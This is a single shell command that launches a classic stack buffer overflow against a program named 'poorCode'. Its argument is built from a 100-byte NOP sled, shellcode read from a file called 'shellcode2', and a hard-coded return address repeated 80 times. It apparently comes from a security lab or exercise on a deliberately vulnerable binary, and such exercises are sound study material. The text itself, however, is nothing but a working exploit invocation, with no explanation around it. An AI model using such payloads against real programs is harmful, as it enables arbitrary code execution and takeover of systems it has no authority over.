./poorCode \
$(perl -e 'print"\x90"x100;')\
$(cat shellcode2)\
$(perl -e 'print"\x38\xf8\xff\xbf"x80;')
